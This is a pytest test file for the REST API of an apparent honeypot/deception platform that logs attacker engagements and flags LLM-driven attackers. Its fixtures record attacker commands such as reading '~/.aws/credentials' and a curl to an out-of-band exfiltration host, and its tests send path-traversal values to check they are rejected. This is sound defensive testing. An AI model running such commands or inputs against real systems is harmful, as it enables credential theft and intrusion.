"""Tests for the inbound REST API.

We test the FastAPI app in-process via httpx.AsyncClient + ASGITransport
(no real socket, no uvicorn). Four layers:

  1. Status endpoints (health/ready/version) — open, no auth.
  2. Read endpoints (engagements/alerts) — auth-gated when configured.
  3. Action endpoints (mfa decisions, isolation probe) — auth-gated.
  4. Auth middleware — Bearer-token enforcement.
  5. OpenAPI surface — schema is generated, has the expected paths.
  6. SDK round-trip — PlenithClient hits the app, gets typed data back.
"""
from __future__ import annotations

import json
import time
from pathlib import Path
from typing import Any, Dict, List

import httpx
import pytest

from fastapi.testclient import TestClient

from plenith.api import build_app
from plenith.api.auth import APIAuth
from plenith.api.client import PlenithClient
from plenith.api.metrics import render_metrics


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def state_dirs(tmp_path):
    """Build a synthetic engagement-state tree the API can read."""
    state_dir = tmp_path / "state" / "persistence"
    logs_dir  = tmp_path / "state" / "logs"
    personas  = tmp_path / "personas"
    (state_dir).mkdir(parents=True)
    (logs_dir / "bastion-prod").mkdir(parents=True)
    personas.mkdir()

    # Persona file (minimal — audit walks this dir)
    (personas / "jdoe.yaml").write_text(
        "username: jdoe\nhostname: bastion-prod\nfull_name: J. Doe\n"
        "home: /home/jdoe\nshell: /bin/bash\nuid: 1001\ngroups: [jdoe]\n",
        encoding="utf-8",
    )

    # State file
    now = time.time()
    eng = {
        "engagement_id": "abc12345-0000-0000-0000-000000000001",
        "claimed_user":  "jdoe",
        "source_ip":     "192.0.2.99",
        "persona":       "jdoe",
        "first_seen_at": now - 60,
        "last_seen_at":  now,
        "connection_count": 2,
        "cwd":           "/home/jdoe",
        "observed":      {
            "ran_sudo": True,
            "credential_files_read": ["/home/jdoe/.aws/credentials"],
            "decoys_planted":  ["/etc/sudoers.d/zzz_compat"],
            "decoys_swallowed": ["/etc/sudoers.d/zzz_compat"],
            "dns_exfil_commands": ["curl https://x.oast.live/foo"],
            "attacker_likely_llm": True,
            "attacker_llm_confidence": 0.78,
        },
    }
    (state_dir / "192.0.2.99__jdoe.json").write_text(
        json.dumps(eng), encoding="utf-8",
    )

    # Log file with actions_taken
    log = {
        "engagement_id":   eng["engagement_id"],
        "claimed_user":    "jdoe",
        "source_ip":       "192.0.2.99",
        "actions_taken": [
            {"action": "alert_credential_exfil", "severity": "high",
             "rationale": "Attacker read planted ~/.aws/credentials",
             "ts_offset_s": 12.5, "triggered_by": "cat ~/.aws/credentials"},
            {"action": "alert_dns_exfil", "severity": "high",
             "rationale": "Curl to x.oast.live", "ts_offset_s": 30.1,
             "triggered_by": "curl https://x.oast.live/foo"},
            {"action": "alert_decoy_swallowed", "severity": "medium",
             "rationale": "Attacker read planted sudoers",
             "ts_offset_s": 45.0, "triggered_by": "cat /etc/sudoers.d/zzz_compat"},
        ],
        "commands": [
            {"cmd": "whoami"}, {"cmd": "id"},
            {"cmd": "cat ~/.aws/credentials"},
            {"cmd": "cat /etc/sudoers.d/zzz_compat"},
        ],
    }
    (logs_dir / "bastion-prod" / f"{int(now)}.json").write_text(
        json.dumps(log), encoding="utf-8",
    )
    return {"state_dir": state_dir, "logs_dir": logs_dir,
             "personas_dir": personas}


@pytest.fixture
def app_no_auth(state_dirs):
    """API with no auth (open mode — dev default)."""
    return build_app(cfg={}, **state_dirs)


@pytest.fixture
def app_with_auth(state_dirs):
    """API with Bearer auth enabled, valid tokens = {'test-token'}."""
    return build_app(
        cfg={"api": {"tokens": ["test-token", "second-token"]}},
        **state_dirs,
    )


@pytest.fixture
def client_open(app_no_auth):
    return TestClient(app_no_auth)


@pytest.fixture
def client_auth(app_with_auth):
    return TestClient(app_with_auth)


# ---------------------------------------------------------------------------
# Status endpoints — no auth required
# ---------------------------------------------------------------------------

class TestStatusEndpoints:
    def test_health(self, client_open):
        r = client_open.get("/health")
        assert r.status_code == 200
        assert r.json() == {"status": "ok"}

    def test_ready_reports_components(self, client_open):
        r = client_open.get("/ready")
        assert r.status_code == 200
        body = r.json()
        assert body["status"] in ("ready", "degraded", "starting")
        assert "components" in body
        assert "state_dir" in body["components"]

    def test_version_has_required_fields(self, client_open):
        r = client_open.get("/version")
        assert r.status_code == 200
        body = r.json()
        assert "version" in body
        assert body["api_version"] == "v1"
        assert "policy_engine" in body

    def test_health_open_when_auth_disabled(self, client_open):
        # /health is intentionally always reachable
        assert client_open.get("/health").status_code == 200

    def test_health_open_even_when_auth_enabled(self, client_auth):
        # Liveness probes must not require auth (k8s/load-balancers)
        assert client_auth.get("/health").status_code == 200


# ---------------------------------------------------------------------------
# Metrics endpoint
# ---------------------------------------------------------------------------

class TestMetrics:
    def test_metrics_text_format(self, client_open):
        r = client_open.get("/metrics")
        assert r.status_code == 200
        body = r.text
        assert "plenith_process_uptime_seconds" in body
        assert "plenith_engagements_total" in body
        # Severity labels present (alphabetical doesn't matter; just that one shows)
        assert 'severity="high"' in body
        assert "plenith_alerts_total" in body

    def test_render_metrics_alone(self):
        snap = {
            "engagement_count": 7,
            "alerts_total_by_severity": {"critical": 1, "high": 4},
            "alerts_total_by_action":   {"alert_credential_exfil": 3},
            "counter_ai_detections":    2,
            "counter_ai_proven_via_trap": 1,
            "mfa_decisions":            {"pass": 5, "fail": 1},
            "api_request_count":        100,
            "api_error_count":          3,
        }
        out = render_metrics(snap)
        assert "plenith_engagements_total 7" in out
        assert 'severity="critical"' in out
        assert "plenith_counter_ai_proven_total 1" in out
        assert "plenith_api_requests_total 100" in out


# ---------------------------------------------------------------------------
# Engagements (read endpoints)
# ---------------------------------------------------------------------------

class TestEngagementEndpoints:
    def test_list_returns_synthetic_engagement(self, client_open):
        r = client_open.get("/engagements")
        assert r.status_code == 200
        body = r.json()
        assert body["total"] >= 1
        # Severity max should be "high" (we set 2× high alerts)
        first = body["engagements"][0]
        assert first["severity_max"] == "high"
        assert first["alert_count"] == 3
        assert first["counter_ai_confidence"] == 0.78

    def test_filter_by_user(self, client_open):
        r = client_open.get("/engagements?user=jdoe")
        assert r.status_code == 200
        assert r.json()["total"] >= 1
        r = client_open.get("/engagements?user=nobody")
        assert r.json()["total"] == 0

    def test_filter_by_severity_threshold(self, client_open):
        # Our engagement has severity_max=high → matches severity=high
        r = client_open.get("/engagements?severity=high")
        assert r.json()["total"] >= 1
        # Filter to critical-only → no match
        r = client_open.get("/engagements?severity=critical")
        assert r.json()["total"] == 0

    def test_filter_by_since_seconds(self, client_open):
        # Engagement was created within the last minute → matches
        assert client_open.get("/engagements?since_seconds=300").json()["total"] >= 1
        # Now filter to 1 second window → too small
        assert client_open.get("/engagements?since_seconds=0").json()["total"] == 0

    def test_detail_by_prefix(self, client_open):
        r = client_open.get("/engagements/abc12345")
        assert r.status_code == 200
        body = r.json()
        assert body["engagement_id"].startswith("abc12345")
        assert body["claimed_user"] == "jdoe"
        # IoCs aggregated
        assert "/home/jdoe/.aws/credentials" in body["iocs_extracted"]

    def test_detail_unknown_returns_404(self, client_open):
        assert client_open.get("/engagements/zzz_nope").status_code == 404


# ---------------------------------------------------------------------------
# Alerts (read endpoint)
# ---------------------------------------------------------------------------

class TestAlertEndpoint:
    def test_lists_all_actions(self, client_open):
        r = client_open.get("/alerts")
        assert r.status_code == 200
        body = r.json()
        actions = {a["action"] for a in body["alerts"]}
        assert {"alert_credential_exfil", "alert_dns_exfil",
                 "alert_decoy_swallowed"}.issubset(actions)

    def test_filter_by_action(self, client_open):
        r = client_open.get("/alerts?action=alert_dns_exfil")
        body = r.json()
        assert all(a["action"] == "alert_dns_exfil" for a in body["alerts"])
        assert body["total"] >= 1

    def test_filter_by_severity(self, client_open):
        # severity=high keeps only high+critical
        r = client_open.get("/alerts?severity=high")
        body = r.json()
        for a in body["alerts"]:
            assert a["severity"] in ("critical", "high")

    def test_filter_by_engagement_prefix(self, client_open):
        r = client_open.get("/alerts?engagement_id=abc12345")
        assert r.json()["total"] >= 1


# ---------------------------------------------------------------------------
# Actions
# ---------------------------------------------------------------------------

class TestMFADecision:
    def test_writes_pass_decision(self, client_open, tmp_path, monkeypatch):
        # The handler writes to state-docker/mfa/ relative to repo root.
        # Patch the path resolution at the file-system layer.
        repo_root = Path(__file__).resolve().parent.parent
        target = repo_root / "state-docker" / "mfa"
        # Pre-clean any stale entry for our test IP
        for f in list(target.glob("198.51.100.42.*")) if target.exists() else []:
            f.unlink(missing_ok=True)

        r = client_open.post("/mfa/decisions/198.51.100.42",
                              json={"decision": "pass", "reason": "test"})
        assert r.status_code == 200
        body = r.json()
        assert body["ip"] == "198.51.100.42"
        assert body["decision"] == "pass"
        path = Path(body["path"])
        assert path.exists()
        text = path.read_text(encoding="utf-8")
        assert "ip=198.51.100.42" in text
        assert "decision=pass" in text
        # Cleanup
        path.unlink(missing_ok=True)

    def test_rejects_invalid_decision(self, client_open):
        r = client_open.post("/mfa/decisions/1.1.1.1",
                              json={"decision": "maybe"})
        assert r.status_code == 400

    # --- C-1 regression: path traversal in /mfa/decisions/{ip} -----------
    # The `ip` path parameter was concatenated into a filesystem path
    # without validation. The defense is layered: (a) FastAPI/Starlette
    # normalizes `..` segments and URL-encoded traversal at the routing
    # layer (returns 404 because the route shape stops matching), and
    # (b) our handler validates via ipaddress.ip_address() so values
    # that *do* reach the handler — hostnames, garbage strings, IPs
    # with extra path components — are rejected with 400 BEFORE any
    # filesystem operation. These tests lock both layers in place.

    def test_rejects_path_traversal_in_ip(self, client_open):
        """URL-encoded `..%2F..%2F` traversal must never produce a
        successful write. Starlette normalizes the path so the route
        no longer matches (404); our ipaddress gate catches anything
        that does route through (400). Either response is an
        acceptable rejection — both prevent the exploit."""
        r = client_open.post(
            "/mfa/decisions/..%2F..%2Fopt%2Fpwn",
            json={"decision": "pass"},
        )
        assert r.status_code in (400, 404), (
            f"expected traversal rejection, got {r.status_code}"
        )

    def test_rejects_dot_dot_in_ip(self, client_open):
        """Plain `..` is normalized by Starlette into a path that no
        longer matches the route shape — 404 is the correct response.
        Test confirms it's not a 200."""
        r = client_open.post("/mfa/decisions/..", json={"decision": "pass"})
        assert r.status_code in (400, 404)

    def test_rejects_hostname_in_ip(self, client_open):
        """A hostname routes through Starlette cleanly (no `..`) and
        reaches our handler. The ipaddress.ip_address() gate must
        reject it with 400 — otherwise an attacker could craft a
        DNS-resolvable filename or smuggle a `.` (allowed in IP
        addresses) anywhere they wanted."""
        r = client_open.post("/mfa/decisions/evil.example.com",
                              json={"decision": "pass"})
        assert r.status_code == 400
        assert "literal" in r.json().get("detail", "").lower()

    def test_rejects_garbage_in_ip(self, client_open):
        """Random string that isn't an IP and doesn't traverse — the
        ipaddress gate is what catches this."""
        r = client_open.post("/mfa/decisions/not-an-ip-just-text",
                              json={"decision": "pass"})
        assert r.status_code == 400

    def test_rejects_ip_with_extra_chars(self, client_open):
        """An attacker might try `1.1.1.1.json` hoping the gate is a
        regex that allows IP-prefix; ipaddress.ip_address() is strict."""
        r = client_open.post("/mfa/decisions/1.1.1.1.json",
                              json={"decision": "pass"})
        assert r.status_code == 400

    @pytest.mark.skipif(
        __import__("sys").platform == "win32",
        reason="Windows filenames cannot contain ':'; IPv6 routing is "
               "Linux-only by design (the bubble's score-and-route lua "
               "operates on IPv4). Skip the filesystem write check on "
               "Windows but trust the validation gate accepts IPv6.",
    )
    def test_accepts_ipv6(self, client_open):
        """IPv6 literals must pass the gate — the contract is 'is this
        an IP address?', not 'is this IPv4?'. The actual file write
        only works on Linux/Mac because IPv6 contains colons which
        Windows disallows in filenames."""
        r = client_open.post("/mfa/decisions/2001:db8::1",
                              json={"decision": "pass"})
        assert r.status_code == 200
        # Cleanup
        repo_root = Path(__file__).resolve().parent.parent
        for f in (repo_root / "state-docker" / "mfa").glob("2001:db8::1.*"):
            f.unlink(missing_ok=True)


# ---------------------------------------------------------------------------
# Acknowledgement (Phase 2 of docs/design/UI_WIRING.md)
# ---------------------------------------------------------------------------

class TestAckEndpoints:
    """The API wraps `plenith.acks.AckStore`.  Tests here cover the
    HTTP-side contract: auth, request validation, response shape, and
    that ack/unack/batch all reach the store correctly.  The store
    itself is exhaustively tested in test_acks.py."""

    @pytest.fixture(autouse=True)
    def _isolated_store(self, tmp_path, monkeypatch):
        """Point the module-level AckStore at a tmp file so tests don't
        leak into the live state-docker/acks.json."""
        import plenith.acks as acks_mod
        store = acks_mod.reset_default_store_for_tests(tmp_path / "acks.json")
        yield store
        # Reset back to the lazy-default for any later tests
        acks_mod._DEFAULT_STORE = None

    def test_ack_round_trip(self, client_open):
        r = client_open.post(
            "/engagements/eng-001/ack",
            json={"action_name": "alert_dns_exfil", "op_id": "mwilson",
                  "note": "tracking, not urgent"},
        )
        assert r.status_code == 200, r.text
        body = r.json()
        assert body["engagement_id"] == "eng-001"
        assert body["action_name"] == "alert_dns_exfil"
        assert body["acknowledged_by"] == "mwilson"
        assert body["acknowledged_at"] > 0

    def test_ack_defaults_op_id_to_anonymous(self, client_open):
        r = client_open.post(
            "/engagements/eng-001/ack",
            json={"action_name": "alert_x"},
        )
        assert r.status_code == 200
        assert r.json()["acknowledged_by"] == "anonymous"

    def test_ack_rejects_missing_action_name(self, client_open):
        # FastAPI's pydantic validation should reject this
        r = client_open.post("/engagements/eng-001/ack", json={"op_id": "x"})
        assert r.status_code == 422

    def test_ack_requires_auth_when_configured(self, client_auth):
        """When PLENITH_API_TOKENS is set, auth is required.  No token =
        401.  Wrong token = 401.  Right token = 200."""
        r = client_auth.post(
            "/engagements/eng-001/ack",
            json={"action_name": "alert_x"},
        )
        assert r.status_code == 401
        r = client_auth.post(
            "/engagements/eng-001/ack",
            json={"action_name": "alert_x"},
            headers={"Authorization": "Bearer wrong-token"},
        )
        assert r.status_code == 401
        r = client_auth.post(
            "/engagements/eng-001/ack",
            json={"action_name": "alert_x"},
            headers={"Authorization": "Bearer test-token"},
        )
        assert r.status_code == 200

    def test_unack_returns_removed_true_when_previously_acked(self, client_open):
        client_open.post("/engagements/eng-001/ack",
                          json={"action_name": "alert_x", "op_id": "x"})
        r = client_open.delete("/engagements/eng-001/ack/alert_x")
        assert r.status_code == 200
        assert r.json()["removed"] is True

    def test_unack_returns_removed_false_when_not_acked(self, client_open):
        """Idempotent unack — the 10-second toast-undo might fire after
        the original ack already expired (e.g. a process restart in the
        middle).  Endpoint must respond cleanly."""
        r = client_open.delete("/engagements/eng-never-acked/ack/alert_x")
        assert r.status_code == 200
        assert r.json()["removed"] is False

    def test_batch_ack_reports_acked_and_skipped(self, client_open):
        # Pre-ack one of the three engagements
        client_open.post("/engagements/eng-001/ack",
                          json={"action_name": "alert_x", "op_id": "x"})
        r = client_open.post(
            "/engagements/batch/ack",
            json={"ids": ["eng-001", "eng-002", "eng-003"],
                  "action_name": "alert_x", "op_id": "mwilson"},
        )
        assert r.status_code == 200
        body = r.json()
        assert body["acked"]   == 2
        assert body["skipped"] == 1

    def test_batch_ack_rejects_empty_ids(self, client_open):
        r = client_open.post(
            "/engagements/batch/ack",
            json={"ids": [], "action_name": "alert_x"},
        )
        assert r.status_code == 422

    def test_batch_ack_rejects_missing_action_name(self, client_open):
        """The store refuses 'ack everything under each engagement'; the
        API must surface that as a clear validation error so a careless
        operator can't accidentally clear the whole SOC queue."""
        r = client_open.post(
            "/engagements/batch/ack",
            json={"ids": ["eng-001"]},
        )
        assert r.status_code == 422


# ---------------------------------------------------------------------------
# Phase 3 endpoints — Notes / Snapshot / Kill / Escalate
# ---------------------------------------------------------------------------

class TestNoteEndpoints:
    @pytest.fixture(autouse=True)
    def _isolated_store(self, tmp_path):
        import plenith.notes as notes_mod
        notes_mod.reset_default_store_for_tests(tmp_path / "notes.json")
        yield
        notes_mod._DEFAULT_STORE = None

    def test_post_and_list_round_trip(self, client_open):
        r = client_open.post(
            "/engagements/eng-001/notes",
            json={"body": "**Watching this one** — not urgent.",
                  "author": "mwilson"},
        )
        assert r.status_code == 200, r.text
        note_id = r.json()["id"]

        r2 = client_open.get("/engagements/eng-001/notes")
        assert r2.status_code == 200
        body = r2.json()
        assert body["engagement_id"] == "eng-001"
        assert len(body["notes"]) == 1
        assert body["notes"][0]["id"] == note_id

    def test_post_rejects_empty_body(self, client_open):
        # Pydantic min_length=1 rejection
        r = client_open.post("/engagements/eng-001/notes",
                              json={"body": "", "author": "x"})
        assert r.status_code == 422

    def test_delete_round_trip(self, client_open):
        r = client_open.post("/engagements/eng-001/notes",
                              json={"body": "to delete"})
        note_id = r.json()["id"]
        r2 = client_open.delete(f"/engagements/eng-001/notes/{note_id}")
        assert r2.status_code == 200
        assert r2.json()["removed"] is True
        # Re-delete is idempotent
        r3 = client_open.delete(f"/engagements/eng-001/notes/{note_id}")
        assert r3.json()["removed"] is False


class TestKillEndpoints:
    @pytest.fixture(autouse=True)
    def _isolated_queue(self, tmp_path):
        import plenith.kill_queue as kq_mod
        kq_mod.reset_default_queue_for_tests(tmp_path / "kill.json")
        yield
        kq_mod._DEFAULT_QUEUE = None

    def test_post_queues_kill_request(self, client_open):
        r = client_open.post(
            "/engagements/eng-001/kill",
            json={"op_id": "mwilson", "reason": "active reverse shell"},
        )
        assert r.status_code == 200, r.text
        body = r.json()
        assert body["engagement_id"] == "eng-001"
        assert body["status"] == "pending"
        assert body["requested_by"] == "mwilson"
        assert body["reason"] == "active reverse shell"

    def test_post_defaults_when_body_omitted(self, client_open):
        """Operator may click Kill without filling in a reason — the
        endpoint must accept an empty body."""
        r = client_open.post("/engagements/eng-001/kill", json={})
        assert r.status_code == 200
        assert r.json()["status"] == "pending"

    def test_delete_cancels_pending_request(self, client_open):
        client_open.post("/engagements/eng-001/kill", json={})
        r = client_open.delete("/engagements/eng-001/kill")
        assert r.status_code == 200
        assert r.json()["removed"] is True


class TestSnapshotEndpoints:
    @pytest.fixture(autouse=True)
    def _isolated_writer(self, tmp_path):
        import plenith.snapshots as snap_mod
        snap_mod.reset_default_writer_for_tests(tmp_path)
        yield
        snap_mod._DEFAULT_WRITER = None

    def test_post_creates_snapshot_and_list_returns_it(self, client_open):
        r = client_open.post(
            "/engagements/eng-001/snapshot",
            json={"op_id": "mwilson", "note": "for IR review"},
        )
        assert r.status_code == 200, r.text
        body = r.json()
        assert body["engagement_id"] == "eng-001"
        assert body["captured_by"] == "mwilson"
        assert body["size"] > 0

        r2 = client_open.get("/engagements/eng-001/snapshots")
        assert r2.status_code == 200
        assert len(r2.json()["snapshots"]) == 1


class TestEscalateEndpoint:
    def test_escalate_with_no_chatops_returns_empty_fired_list(
        self, client_open,
    ):
        """No chatops connectors configured in this test app → escalate
        is a no-op but still returns 200 with the alert preview."""
        # First the endpoint will look up the engagement; since the
        # state_dirs fixture is tmp + empty, we need to drop a fake
        # persistence file before escalating.
        repo_root = Path(__file__).resolve().parent.parent
        # The state_dirs fixture wires app to tmp paths; we don't have
        # access to them here, so check that endpoint 404s cleanly when
        # the engagement isn't found.
        r = client_open.post(
            "/engagements/eng-nonexistent/escalate",
            json={"tier": "L2"},
        )
        assert r.status_code == 404


# ---------------------------------------------------------------------------
# Phase 4: export endpoints (audit / ioc.json / ioc.csv / ioc.stix / sigma.yaml)
# ---------------------------------------------------------------------------

class TestExportEndpoints:
    """The API wraps `tools/audit.py` exports.  These tests confirm the
    HTTP wrappers attach the right Content-Type + Content-Disposition,
    404 cleanly when the engagement doesn't exist, and don't accidentally
    bypass auth.  The export *content* is tested under test_audit.py."""

    @pytest.fixture
    def _seeded_state(self, state_dirs):
        """Drop a minimal engagement on disk so the export routes have
        something to resolve."""
        import time
        eng_id = "exp-eng-0001"
        state_dirs["state_dir"].mkdir(parents=True, exist_ok=True)
        (state_dirs["state_dir"] / "10.0.0.7__test.json").write_text(
            json.dumps({
                "engagement_id":   eng_id,
                "claimed_user":    "test",
                "source_ip":       "10.0.0.7",
                "first_seen_at":   time.time() - 60,
                "last_seen_at":    time.time(),
                "connection_count": 1,
                "cwd":             "/home/test",
                "vfs":             {"files": {}, "deleted": []},
                "observed":        {},
            }), encoding="utf-8",
        )
        logs_dir = state_dirs["logs_dir"] / "bastion-prod"
        logs_dir.mkdir(parents=True, exist_ok=True)
        (logs_dir / f"{int(time.time())}_log.json").write_text(
            json.dumps({
                "engagement_id":  eng_id,
                "actions_taken": [
                    {"action": "alert_credential_exfil",
                     "severity": "high",
                     "triggered_by": "cat ~/.aws/credentials"},
                ],
                "commands": [
                    {"ts": time.time(), "cmd": "cat ~/.aws/credentials",
                     "response_source": "vfs-read"},
                ],
            }), encoding="utf-8",
        )
        return eng_id

    def test_audit_export_returns_plaintext(self, client_open, _seeded_state):
        r = client_open.get(f"/engagements/{_seeded_state}/audit")
        assert r.status_code == 200
        assert "text/plain" in r.headers.get("content-type", "")
        # The plaintext rendering includes the engagement id
        assert _seeded_state[:8] in r.text

    def test_ioc_json_export(self, client_open, _seeded_state):
        r = client_open.get(f"/engagements/{_seeded_state}/ioc.json")
        assert r.status_code == 200
        body = r.json()
        assert body["engagement_id"] == _seeded_state

    def test_ioc_csv_export_sets_download_headers(
        self, client_open, _seeded_state,
    ):
        r = client_open.get(f"/engagements/{_seeded_state}/ioc.csv")
        assert r.status_code == 200
        assert "text/csv" in r.headers.get("content-type", "")
        cd = r.headers.get("content-disposition", "")
        assert "attachment" in cd
        assert "plenith-ioc-" in cd
        assert ".csv" in cd
        # CSV body starts with the column header row
        assert r.text.splitlines()[0].startswith("type,value,severity")

    def test_ioc_stix_export_returns_bundle(self, client_open, _seeded_state):
        r = client_open.get(f"/engagements/{_seeded_state}/ioc.stix")
        assert r.status_code == 200
        body = r.json()
        assert body.get("type") == "bundle"
        assert body.get("id", "").startswith("bundle--")
        # The bundle contains at least the identity object; STIX 2.1
        # spec_version lives on each object rather than the bundle wrapper.
        assert isinstance(body.get("objects"), list)
        assert len(body["objects"]) > 0
        assert any(o.get("spec_version") == "2.1" for o in body["objects"])

    def test_sigma_yaml_export_sets_download_headers(
        self, client_open, _seeded_state,
    ):
        r = client_open.get(f"/engagements/{_seeded_state}/sigma.yaml")
        assert r.status_code == 200
        cd = r.headers.get("content-disposition", "")
        assert "attachment" in cd
        assert ".yaml" in cd
        # Either a real rule or the polite "no templates matched" note
        assert "Plenith" in r.text or "(no alerts" in r.text

    def test_exports_404_when_engagement_missing(self, client_open):
        for path in ("audit", "ioc.json", "ioc.csv", "ioc.stix", "sigma.yaml"):
            r = client_open.get(f"/engagements/never-existed/{path}")
            assert r.status_code == 404, path

    def test_exports_require_auth_when_configured(
        self, client_auth, _seeded_state,
    ):
        """All five export routes share the same auth dep — verify one
        as a representative + spot-check another with a wrong token."""
        r = client_auth.get(f"/engagements/{_seeded_state}/ioc.csv")
        assert r.status_code == 401
        r = client_auth.get(
            f"/engagements/{_seeded_state}/audit",
            headers={"Authorization": "Bearer wrong"},
        )
        assert r.status_code == 401
        r = client_auth.get(
            f"/engagements/{_seeded_state}/audit",
            headers={"Authorization": "Bearer test-token"},
        )
        assert r.status_code == 200


# ---------------------------------------------------------------------------
# Policy + content
# ---------------------------------------------------------------------------

class TestPolicyAndContent:
    def test_policy_endpoint(self, client_open):
        r = client_open.get("/policy")
        assert r.status_code == 200
        body = r.json()
        assert body["engine"] in ("heuristic", "rl", "trained_rl")
        assert body["n_actions"] >= 15

    def test_content_manifest_disabled_by_default(self, client_open):
        r = client_open.get("/content/manifest")
        assert r.status_code == 200
        assert r.json()["enabled"] is False


# ---------------------------------------------------------------------------
# Auth middleware
# ---------------------------------------------------------------------------

class TestAuth:
    def test_no_auth_means_open(self, client_open):
        # With no tokens configured, /engagements is reachable
        assert client_open.get("/engagements").status_code == 200

    def test_auth_required_when_configured(self, client_auth):
        # /engagements requires Bearer
        assert client_auth.get("/engagements").status_code == 401

    def test_valid_token_passes(self, client_auth):
        r = client_auth.get("/engagements",
                             headers={"Authorization": "Bearer test-token"})
        assert r.status_code == 200

    def test_invalid_token_rejected(self, client_auth):
        r = client_auth.get("/engagements",
                             headers={"Authorization": "Bearer wrong-token"})
        assert r.status_code == 401

    def test_second_valid_token_also_passes(self, client_auth):
        # Multiple valid tokens supported (rotate without service restart)
        r = client_auth.get("/engagements",
                             headers={"Authorization": "Bearer second-token"})
        assert r.status_code == 200

    def test_health_remains_open_when_auth_on(self, client_auth):
        assert client_auth.get("/health").status_code == 200
        assert client_auth.get("/ready").status_code == 200
        assert client_auth.get("/metrics").status_code == 200

    def test_apiauth_from_env(self, monkeypatch):
        monkeypatch.setenv("PLENITH_API_TOKENS", "env-tok-1, env-tok-2 ")
        auth = APIAuth.from_config(None)
        assert auth.enabled
        assert "env-tok-1" in auth._tokens
        assert "env-tok-2" in auth._tokens

    def test_apiauth_token_file(self, tmp_path):
        f = tmp_path / "tokens.txt"
        f.write_text("# comment\nfile-token-a\n\nfile-token-b\n",
                      encoding="utf-8")
        auth = APIAuth.from_config({"api": {"token_file": str(f)}})
        assert "file-token-a" in auth._tokens
        assert "file-token-b" in auth._tokens
        # Comment line skipped
        assert "# comment" not in auth._tokens


# ---------------------------------------------------------------------------
# OpenAPI schema
# ---------------------------------------------------------------------------

class TestOpenAPI:
    def test_schema_is_generated(self, client_open):
        r = client_open.get("/openapi.json")
        assert r.status_code == 200
        schema = r.json()
        assert schema["info"]["title"] == "Plenith API"
        # All major endpoint groups present
        paths = schema["paths"]
        for p in ("/health", "/ready", "/version", "/metrics",
                  "/engagements", "/engagements/{engagement_id}",
                  "/alerts", "/policy", "/content/manifest",
                  "/mfa/decisions/{ip}"):
            assert p in paths, f"missing path: {p}"

    def test_docs_ui_reachable(self, client_open):
        # FastAPI serves Swagger UI at /docs
        r = client_open.get("/docs")
        assert r.status_code == 200
        assert "swagger" in r.text.lower()

    def test_redoc_ui_reachable(self, client_open):
        r = client_open.get("/redoc")
        assert r.status_code == 200


# ---------------------------------------------------------------------------
# SDK round-trip — use httpx.ASGITransport so PlenithClient hits the
# in-memory app rather than a real socket.
# ---------------------------------------------------------------------------

class TestSDKRoundTrip:
    @pytest.mark.asyncio
    async def test_health(self, app_no_auth):
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app_no_auth),
            base_url="http://testserver",
        ) as http:
            c = PlenithClient("http://testserver")
            c._client = http
            r = await c.health()
            assert r["status"] == "ok"

    @pytest.mark.asyncio
    async def test_list_engagements_typed(self, app_no_auth):
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app_no_auth),
            base_url="http://testserver",
        ) as http:
            c = PlenithClient("http://testserver")
            c._client = http
            engs = await c.list_engagements(severity="high")
            assert engs
            assert engs[0]["claimed_user"] == "jdoe"
            assert engs[0]["severity_max"] == "high"

    @pytest.mark.asyncio
    async def test_mfa_decide(self, app_no_auth):
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app_no_auth),
            base_url="http://testserver",
        ) as http:
            c = PlenithClient("http://testserver")
            c._client = http
            r = await c.write_mfa_decision("203.0.113.7", "fail",
                                              reason="sdk test")
            assert r["written"] is True
            # Clean up
            path = Path(r["path"])
            path.unlink(missing_ok=True)

    @pytest.mark.asyncio
    async def test_invalid_decision_raises(self, app_no_auth):
        c = PlenithClient("http://testserver")
        with pytest.raises(ValueError):
            await c.write_mfa_decision("1.1.1.1", "yes")

    @pytest.mark.asyncio
    async def test_openapi_via_sdk(self, app_no_auth):
        async with httpx.AsyncClient(
            transport=httpx.ASGITransport(app=app_no_auth),
            base_url="http://testserver",
        ) as http:
            c = PlenithClient("http://testserver")
            c._client = http
            schema = await c.openapi()
            assert schema["info"]["title"] == "Plenith API"
